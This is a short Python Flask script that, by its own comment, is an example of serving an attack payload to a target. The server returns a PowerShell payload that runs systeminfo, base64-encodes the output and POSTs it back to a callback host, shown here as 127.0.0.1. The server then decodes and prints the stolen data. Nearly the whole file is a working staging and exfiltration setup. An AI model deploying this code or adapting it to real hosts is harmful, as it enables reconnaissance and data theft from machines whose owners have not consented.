# This file gives an example of sending the attack payload back to the target

from flask import Flask, request
import base64

app = Flask('__main__')
payload = '''
$i=systeminfo
$b=[System.Text.Encoding]::UTF8.GetBytes($i);
$p=@{d=[System.Convert]::ToBase64String($b)}
IWR -Uri 127.0.0.1 -Method POST -Body $p;
'''

@app.route('/', methods = ['POST', 'GET'])
def root():
	if request.method == 'POST':
		data = request.form.get('d')
		plain = base64.b64decode(data).decode('UTF-8')
		print plain
		return ''
	else:
		return payload

if __name__ == '__main__':
	app.run(port = 80, use_reloader = True)
